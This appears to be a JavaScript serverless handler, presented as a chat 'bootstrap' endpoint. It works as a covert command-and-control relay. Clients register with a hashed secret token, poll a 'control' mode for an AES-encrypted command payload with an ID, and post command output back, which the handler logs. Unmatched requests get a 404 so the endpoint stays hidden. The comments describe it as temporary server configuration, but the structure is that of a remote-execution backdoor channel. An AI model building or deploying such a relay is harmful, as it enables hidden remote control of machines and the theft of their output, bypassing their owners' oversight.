import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '2';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+fG5TYWwX3rl3OcsUvvdJs8cCoJoJhDdWRGExivav3Bv7B21GpSIu2UJJPUl5lfW82nARGfRLURYwfl453/VjZJYIteJ0zKLpsUQEKSe1bct6Cz3+5xq1N+Z8LgnN1MtC/8nsxLLRJlf2PCKSj64P7F/89+eRDx/dnpjlaRV3Skl3amqVDDPGGfOKpW8UMhs2DwuZGWxJNPriBVICJaf4dq1jl6p7IM/lcg5UDMg5tV+CRC9TL17siRaDRHOaYTvEP3HcypXLnuFWrDs22pX0HbRYK2bDggdRS+W7P2j0uTdwQYC3uOHQB6xzmmI1VyLmq51Dtd8zsefkBRZDt80vNrDZk6J3bnVslRB20UVGjASwA1P1A4ncYxLgAxVQKx2sJJJRmvhWi2vczv6l56s01TY7kgx6V5+Cxu2mjZE4tDauG/e2MEoZI0Jmiu7OGr+y61FhqeQIoFLNPhipG6NcEVUmNqNDwKurSCcjnd3CEbqgWJ3R621stcnKRfmmS0AlDM5BB9FTRheutNgh1zaUbUp46d0e0rR5X4k6zuewTWiHA0FNdfUEQ8MDxwP0sCcskpZpR7OBHNdoFKX+IUMr66CCaNnksiosaYEqJVSGkbwbqzkjHvGIAIXnYocMgrcSPlbydykOchLiw7HHQkFyvByr3YxwFZCOxBhoEadIyt2sAESsm2dOSjIqZP20I8nm9ve1cf5DIR7YrqnhjWGroxEii8PCNJewUwtBf9EoIIt80M9e1xQLA6vSOQfeJ1DZ3Cf9JMCLoaAdNSWBVew2kkURUWXbiGciZvYJYdJOHYSq9pEthXOqft1oC2blDrPTyh5U6rrcjaQ90UFBfPbhxiciHOL5tb8FcG30Jmx7zXLD1Y9DQfkcuM6fYInCc/XKTE8N36PHuXw8GdqgKnSOrmB+2kr8RUHh/NN1TH2mnSlPKans7B3TCWwDoOFLEhVaTMhDMgfXzjjWeUp6DXpvZt3IgiRfkJ77z+NJJVE/kcHNNz5F+801u2ByhSkwz6uEdF59zUR3VV+IpIOlxj8IksOKyyuLYuyoYRSdsiVWs4aKUZGWPDt2/R9oCsWq7HjgKCildOMpZtM3P01HWdriwE/uIovfapNbLpOKIpWN+UDPoEZUBgQyECqIGOyr4F9CKPk52rObtu/3dYRV2R3yLxFjuTGPesrUxZ7aX/pOCNc7dCx/QnC24Ehy/LfQV58K2JGv5ZBv2wVcm3F9KrlEur41Hj7Yj6V94qlLbISmhm+M+8NtGoI0Ik8yCnPZBF7xxa/J59IcL15Catl6Tro1Pz62BS++1k+UAP7Qmewq8IGyB+uiYbcUgS6ggAAehunP/GxZ3xOPwcTgKjmQyQMTBSJ7EQXj+OVUxXQqpafKiVwyh7TRTvty3bGonNbn3A6BvN9CtgQSM/wmK1GWCFmUejmVdqdL5YW7bJ6hft9J/VwUFhHNKIjiAsF4BX6nXFOWtcLMf9S1ZsIcTiJgAtruLuNUh+XwXYGV7guzXpBaCUvPjP2BKl2WpTjMbi3/IqvRD6+xcNVwaNUJuKii31y72LBFZq4MzvC4a1OF/PO0ZXTYlN0Y77apncb9bjO9tQGiJ0K+jz+sElMLHV9opG7z+gkWEHiuPlaaceZCDV8dDEWEuvuYAYgwl7eYBGUVYCuk0IFNYcQcnZD+jj3pncAvAjpsbNJSCIs7qwX9YexIyPukhexhL67V4ttqtz/pmC+4V63IXf7RhcQ==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
